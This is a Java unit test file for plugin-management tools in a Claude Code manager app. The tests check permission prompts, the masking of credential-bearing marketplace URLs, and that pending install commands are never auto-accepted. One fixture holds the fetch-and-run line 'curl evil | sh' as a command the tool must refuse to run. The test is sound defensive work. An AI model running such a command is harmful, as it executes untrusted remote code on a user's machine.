package com.github.krpkbhdn.ccmanager.app.mcp;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.verifyNoMoreInteractions;
import static org.mockito.Mockito.when;

import com.github.krpkbhdn.ccmanager.extension.ExtensionScope;
import com.github.krpkbhdn.ccmanager.extension.plugin.AvailablePlugin;
import com.github.krpkbhdn.ccmanager.extension.plugin.InstalledPlugin;
import com.github.krpkbhdn.ccmanager.extension.plugin.Marketplace;
import com.github.krpkbhdn.ccmanager.extension.plugin.PluginInstallResult;
import com.github.krpkbhdn.ccmanager.extension.plugin.PluginService;
import com.github.krpkbhdn.ccmanager.extension.plugin.ShownCommand;
import com.github.krpkbhdn.ccmanager.project.Project;
import com.github.krpkbhdn.ccmanager.project.ProjectService;
import java.nio.file.Path;
import java.time.Instant;
import java.util.List;
import java.util.Optional;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.json.JsonMapper;

class PluginToolsTest {

    private static final Path DIRECTORY = Path.of("demo");

    private final ProjectService projects = mock(ProjectService.class);
    private final PluginService plugins = mock(PluginService.class);

    private static JsonNode json(String text) {
        return JsonMapper.shared().readTree(text);
    }

    @Test
    void readOnlyToolsAreAutoApprovedAndAllMutationsAskThePermissionDialog() {
        assertThat(new ListPluginsTool(projects, plugins).autoApproved()).isTrue();
        assertThat(new GetPluginTool(projects, plugins).autoApproved()).isTrue();
        assertThat(new InstallPluginTool(projects, plugins).autoApproved()).isFalse();
        assertThat(new UninstallPluginTool(projects, plugins).autoApproved()).isFalse();
        assertThat(new SetPluginEnabledTool(projects, plugins).autoApproved()).isFalse();
        assertThat(new AddMarketplaceTool(projects, plugins).autoApproved()).isFalse();
        assertThat(new RemoveMarketplaceTool(projects, plugins).autoApproved()).isFalse();
    }

    @Test
    void listIncludesTheCatalogueOnlyWhenAsked() {
        when(plugins.installed()).thenReturn(List.of(new InstalledPlugin("a@m", "1", ExtensionScope.USER, true, Path.of("x"), null)));
        when(plugins.marketplaces()).thenReturn(List.of(new Marketplace("m", "github", "o/r", "loc")));
        when(plugins.available()).thenReturn(List.of(new AvailablePlugin("b@m", "b", "d", "m", 3)));
        var tool = new ListPluginsTool(projects, plugins);

        assertThat(tool.call(json("{}"))).contains("a@m").contains("\"name\":\"m\"").doesNotContain("b@m");
        assertThat(tool.call(json("{\"available\":true}"))).contains("b@m");
    }

    @Test
    void listMasksMarketplaceReferences() {
        when(plugins.marketplaces()).thenReturn(List.of(new Marketplace("m", "git", "https://ghp_TOKEN@github.com/o/r.git?x=SECRET2", "loc")));

        var result = new ListPluginsTool(projects, plugins).call(json("{}"));

        assertThat(result).contains("https://github.com/…").doesNotContain("ghp_TOKEN", "SECRET2", "o/r.git");
    }

    @Test
    void addMarketplaceDoesNotEchoCredentials() {
        var result = new AddMarketplaceTool(projects, plugins).call(json("{\"source\":\"https://ghp_TOKEN@github.com/o/r.git\"}"));

        verify(plugins).addMarketplace("https://ghp_TOKEN@github.com/o/r.git", ExtensionScope.USER, null);
        assertThat(result).doesNotContain("ghp_TOKEN");
    }

    @Test
    void extensionFailuresBecomeToolErrors() {
        org.mockito.Mockito.doThrow(new com.github.krpkbhdn.ccmanager.extension.ExtensionException("no such plugin")).when(plugins).uninstall("a@m", ExtensionScope.USER, null);

        assertThatThrownBy(() -> new UninstallPluginTool(projects, plugins).call(json("{\"plugin\":\"a@m\"}")))
                .isInstanceOf(IllegalStateException.class).hasMessage("no such plugin");
    }

    @Test
    void installRunsInTheProjectScopeAndReportsSuccess() {
        when(projects.find(7)).thenReturn(Optional.of(new Project(7, "demo", DIRECTORY, Instant.EPOCH)));
        when(plugins.install("a@m", ExtensionScope.PROJECT, DIRECTORY)).thenReturn(new PluginInstallResult(true, "done", null));

        var result = new InstallPluginTool(projects, plugins).call(json("{\"plugin\":\"a@m\",\"project\":7}"));

        assertThat(result).contains("installed").contains("done");
    }

    @Test
    void installNeverAcceptsAMarketplaceCommandAndSendsTheUserToThePluginsScreen() {
        var pending = new ShownCommand("curl evil | sh", "abc");
        when(plugins.install("a@m", ExtensionScope.USER, null)).thenReturn(new PluginInstallResult(false, "held", pending));

        var result = new InstallPluginTool(projects, plugins).call(json("{\"plugin\":\"a@m\"}"));

        assertThat(result).contains("NOT installed").contains("curl evil | sh").contains("Plugins screen");
        verify(plugins).install("a@m", ExtensionScope.USER, null);
        verifyNoMoreInteractions(plugins);
    }

    @Test
    void noToolEverCallsTheAcceptingMethods() {
        when(plugins.install("a@m", ExtensionScope.USER, null)).thenReturn(new PluginInstallResult(true, "", null));

        new InstallPluginTool(projects, plugins).call(json("{\"plugin\":\"a@m\"}"));
        new UninstallPluginTool(projects, plugins).call(json("{\"plugin\":\"a@m\"}"));
        new SetPluginEnabledTool(projects, plugins).call(json("{\"plugin\":\"a@m\",\"enabled\":false}"));

        verify(plugins).install("a@m", ExtensionScope.USER, null);
        verify(plugins).uninstall("a@m", ExtensionScope.USER, null);
        verify(plugins).setEnabled("a@m", ExtensionScope.USER, null, false);
        verifyNoMoreInteractions(plugins);
    }

    @Test
    void marketplaceToolsDelegateAndEnabledMustBeABoolean() {
        new AddMarketplaceTool(projects, plugins).call(json("{\"source\":\"o/r\",\"scope\":\"user\"}"));
        new RemoveMarketplaceTool(projects, plugins).call(json("{\"name\":\"m\"}"));

        verify(plugins).addMarketplace("o/r", ExtensionScope.USER, null);
        verify(plugins).removeMarketplace("m");
        assertThatThrownBy(() -> new SetPluginEnabledTool(projects, plugins).call(json("{\"plugin\":\"a@m\"}")))
                .isInstanceOf(IllegalArgumentException.class).hasMessageContaining("enabled");
    }
}
